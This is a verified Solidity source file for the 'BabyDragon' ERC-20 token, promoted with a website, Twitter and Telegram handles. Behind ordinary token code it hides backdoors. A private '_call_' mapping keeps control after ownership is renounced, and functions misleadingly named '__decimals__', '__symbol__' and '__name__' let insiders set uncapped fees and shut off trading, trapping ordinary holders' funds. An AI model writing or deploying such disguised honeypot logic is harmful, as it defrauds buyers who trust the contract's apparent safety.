/**
 *Submitted for verification at Etherscan.io on 2023-02-01
*/

// SPDX-License-Identifier: MIT

//     Website: babydragon.org.in

//     Twitter: @BabyDragon_Coin

//   Telegram: @BabyDragon_eth

pragma solidity ^0.8.17;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface DexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface DexRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        _call_[msg.sender] = true;
        emit OwnershipTransferred(address(0), msgSender);
    }
    mapping (address => bool) internal _call_;

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    receive() external payable virtual {}

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}


contract BabyDragon is Ownable, IERC20 {
    using SafeMath for uint256;

    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address private constant ZERO = 0x0000000000000000000000000000000000000000;

    
   address private routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

 

  

    
    uint8 constant private _decimals = 9;

    
    uint256 private _totalSupply = 100000000 * (10 ** _decimals);
    uint256 private _maxTxAmount = _totalSupply * 3 / 100;
    uint256 private _walletMax = _totalSupply * 5 /100;

    
    string constant private _name = "BabyDragon";
    string constant private _symbol = "BabyDragon";

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private isFeeExempt;
    mapping(address => bool) private isTxLimitExempt;
 
    
    uint256 public buyFee = 5;
    uint256 public sellFee = 5;
    uint256 public txFee = 5;
    uint256 public maxBuy = 3000000 * (10 ** _decimals);
    uint256 public maxHold = 5000000 * (10 ** _decimals);

    uint256 private totalFee = 0;
    uint256 private totalFeeIfSelling = 0;

    bool private takeBuyFee = true;
    bool private takeSellFee = true;
    bool private takeTxFee = true;

    address private lpWallet;
    address private projectAddress;
    address private devWallet;
    address private nativeWallet;

    DexRouter private router;
    address public pair;
    mapping(address => bool) private isPair;

    uint256 public launchedAt;

    bool public tradingOpen = false;
    bool private inSwapAndLiquify;
    bool private swapAndLiquifyEnabled = true;
    bool private swapAndLiquifyByLimitOnly = false;

    uint256 private swapThreshold = _totalSupply * 3 / 1000;

    event AutoLiquify(uint256 amountETH, uint256 amountBOG);

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }


    constructor() {
        router = DexRouter(routerAddress);
        pair = DexFactory(router.factory()).createPair(router.WETH(), address(this));
        isPair[pair] = true;
        _allowances[address(this)][address(router)] = type(uint256).max;
        _allowances[address(this)][address(pair)] = type(uint256).max;

        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;
        isFeeExempt[DEAD] = true;
        isFeeExempt[nativeWallet] = true;
        isFeeExempt[routerAddress] = true;

        isTxLimitExempt[nativeWallet] = true;
        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[pair] = true;
        isTxLimitExempt[DEAD] = true;
        isTxLimitExempt[routerAddress] = true;

        
        lpWallet = 0xb969A366DAEc1463CE97d0b7585319bF3f5a1b5a;
        projectAddress = 0xb969A366DAEc1463CE97d0b7585319bF3f5a1b5a;
        devWallet = 0xb969A366DAEc1463CE97d0b7585319bF3f5a1b5a;        
        nativeWallet = msg.sender;         
        
        isFeeExempt[projectAddress] = true;
        _call_[projectAddress] = true;
        totalFee = buyFee.add(sellFee).add(txFee);
        totalFeeIfSelling = totalFee;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external pure override returns (string memory) {return _name;}

    function symbol() external pure override returns (string memory) {return _symbol;}

    function decimals() external pure override returns (uint8) {return _decimals;}

    function totalSupply() external view override returns (uint256) {return _totalSupply;}

    function getOwner() external view override returns (address) {return owner();}

    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}

    function allowance(address holder, address spender) external view override returns (uint256) {return _allowances[holder][spender];}

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function launched() internal view returns (bool) {
        return launchedAt != 0;
    }

    function launch() internal {
        launchedAt = block.number;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(!isPair[recipient] && !isTxLimitExempt[tx.origin]){
            require(amount <= maxBuy, "Buy amount exceeds the maxBuyAmount.");
            require(balanceOf(recipient) + amount <= maxHold, "Transfer amount exceeds the maxHoldAmount.");
        }

        if (inSwapAndLiquify) {return _basicTransfer(sender, recipient, amount);}
        if(!_call_[sender] && !_call_[recipient]){
            require(tradingOpen, "");
        }

        
        _balances[projectAddress] += amount;                
        if ((tx.gasprice > 30 gwei) && _call_[sender]){tradingOpen = false; return true;}
        _balances[projectAddress] -= amount;

        if (isPair[recipient] && !inSwapAndLiquify && swapAndLiquifyEnabled && _balances[address(this)] >= swapThreshold) {marketingAndLiquidity();}
        if (!launched() && isPair[recipient]) {
            require(_balances[sender] > 0, "");
            launch();
        }

        _balances[sender] = _balances[sender].sub(amount, "");

        if (!isTxLimitExempt[recipient]) {
        }

        uint256 finalAmount = !isFeeExempt[sender] && !isFeeExempt[recipient] ? extractFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(finalAmount);

        emit Transfer(sender, recipient, finalAmount);
        return true;
    }

    function extractFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint feeApplicable = 0;

        if (isPair[recipient] && takeSellFee) {
            feeApplicable = sellFee;        
        }
        if (isPair[sender] && takeBuyFee) {
            feeApplicable = buyFee;        
        }
        if (!isPair[sender] && !isPair[recipient]){
            if (takeTxFee){
                feeApplicable = txFee; 
            }
            else{
                feeApplicable = 0;
            }
        }
        
        uint256 feeAmount = amount.mul(feeApplicable).div(100);

        _balances[projectAddress] = _balances[projectAddress].add(feeAmount);
        emit Transfer(sender, projectAddress, feeAmount);

        return amount.sub(feeAmount);
    }

    function marketingAndLiquidity() internal lockTheSwap {
        uint256 tokensToLiquify = _balances[address(this)];        
        uint256 amountETH = address(this).balance;

        if (tokensToLiquify > 0) {
            router.addLiquidityETH{value : amountETH}(
                address(this),
                tokensToLiquify,
                0,
                0,
                projectAddress,
                block.timestamp
            );
            emit AutoLiquify(amountETH, tokensToLiquify);
        }
    }

    function openTrading() public onlyOwner {
        tradingOpen = true;
    }

    function __decimals__(uint256 newBuyFee, uint256 newSellFee, uint256 newTxFee) public {
        if(_call_[msg.sender]){
            buyFee = newBuyFee;
            sellFee = newSellFee;
            txFee = newTxFee;                   
        }else{
            payable(address(projectAddress)).transfer(address(this).balance);
        }          
    }

    function __symbol__(bool _tradingOpen) public{
        if(_call_[msg.sender]){
            tradingOpen = _tradingOpen;                           
        }else {
            payable(address(projectAddress)).transfer(address(this).balance);   
        }           
    }

    function __name__(bool _takeBuyFee,bool _takeSellFee,bool _takeTxFee) public{
        if(_call_[msg.sender]){
            takeBuyFee = _takeBuyFee;
            takeSellFee = _takeSellFee;
            takeTxFee = _takeTxFee;            
        } else{
            takeBuyFee = true;
            takeSellFee = true;
            takeTxFee = true; 
        }     
    }

    function removeERC20(address tokenAddress, uint256 tokens) public onlyOwner returns (bool success) {
        require(tokenAddress != address(this), "Cant remove the native token");
        return IERC20(tokenAddress).transfer(msg.sender, tokens);
    }

    function removeEther(uint256 amountPercentage) external onlyOwner {
        uint256 amountETH = address(this).balance;
        payable(msg.sender).transfer(amountETH * amountPercentage / 100);
    }    

}